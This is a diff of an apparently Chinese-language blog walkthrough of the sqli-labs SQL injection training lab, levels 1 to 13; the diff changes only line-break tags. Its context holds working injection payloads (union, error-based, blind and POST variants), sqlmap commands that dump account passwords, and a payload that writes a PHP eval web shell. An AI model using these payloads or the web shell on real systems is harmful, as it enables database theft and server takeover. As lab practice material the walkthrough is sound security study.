@@ -312,17 +312,17 @@
 <p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
 <h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
 <p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
-<br/>
+<br>
 
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 
@@ -332,14 +332,14 @@
 <p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
-<br/>
+<br>
 
 <h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>用<code>&quot;)</code>闭合</p>
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
-<br/>
+<br>
 
 <h3 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5.报错注入"></a>5.报错注入</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
@@ -353,7 +353,7 @@
 <p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
 <p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
 <p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
-<br/>
+<br>
 
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
@@ -361,9 +361,9 @@
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
 <p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
-<br/>
+<br>
 
-<br/>
+<br>
 
 <h3 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -375,7 +375,7 @@
 <p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
 <p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
 <p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
-<br/>
+<br>
 
 <h3 id="7-文件写入"><a href="#7-文件写入" class="headerlink" title="7.文件写入"></a>7.文件写入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -384,7 +384,7 @@
 <blockquote>
 <p>有数据库的写入权限</p>
 <p>知道网站的绝对路径</p>
-<br/>
+<br>
 </blockquote>
 <p>在做写入练习时，需要用到<code>into outfile</code> ,但执行后却无法生成写入文件</p>
 <p>解决方案</p>
@@ -394,7 +394,7 @@
 <p>在my.ini中修改或添加<code>secure_file_priv=&quot;/&quot;</code>然后报存并重启数据库 </p>
 <p>运行<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>成功生产写入文件</p>
 </blockquote>
-<br/>
+<br>
 
 <p>根据代码进行闭合<code>id=1&#39;)) --+</code></p>
 <p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 不报错说明是root权限</p>
@@ -402,12 +402,12 @@
 <p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <p>?id=-1’)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7”–+</p>
 <p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
 <p>使用菜刀连接</p>
-<br/>
+<br>
 
 <h3 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
@@ -439,7 +439,7 @@
 <p>依次得到后面7位 ==&gt;数据库名为security</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<br/>
+<br>
 
 <p>获取数据库第一张表的长度(注:这里length()里面要再加一个括号 )</p>
 <p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
@@ -447,7 +447,7 @@
 <p>也可以这样写</p>
 <p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> 最终得到长度为6</p>
 <p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> 判断第X张表的长度</p>
-<br/>
+<br>
 
 <ul>
 <li>判断表的第N个字符 截取第N位的ASCII码进行判断,利用<code>ord()</code> 和 <code>mid(***,1,1)</code>或者<code>substr(***,1,1)</code></li>
@@ -458,7 +458,7 @@
 <p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
 <p>也可以利用<code>regexp</code>注入获取<code>users</code>表中的列</p>
 <p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
-<br/>
+<br>
 
 <p>使用SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
@@ -468,7 +468,7 @@
 <p>支持的探测方式如下：</p>
 <p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
 </blockquote>
-<br/>
+<br>
 
 <h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
@@ -480,13 +480,13 @@
 <p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>判断表长度(length()里面的需要加<code>()</code>)</p>
 <p>使用SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
-<br/>
+<br>
 
 <h3 id="10-时间盲注"><a href="#10-时间盲注" class="headerlink" title="10.时间盲注"></a>10.时间盲注</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
 <p>和第九关一样，不过是双引号闭合</p>
 <p><code>?id=1&quot; and sleep(5)--+</code></p>
-<br/>
+<br>
 
 <h3 id="11-POST注入"><a href="#11-POST注入" class="headerlink" title="11.POST注入"></a>11.POST注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>
 
@@ -494,7 +494,7 @@
 <p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>判断字段数</p>
 <p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> 找回显点</p>
 <p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>查看数据库版本</p>
-<br/>
+<br>
 
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
@@ -503,7 +503,7 @@
 <p><code>&quot;) #</code>闭合</p>
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
-<br/>
+<br>
 
 <h3 id="13-POST型布尔盲注"><a href="#13-POST型布尔盲注" class="headerlink" title="13 POST型布尔盲注"></a>13 POST型布尔盲注</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span 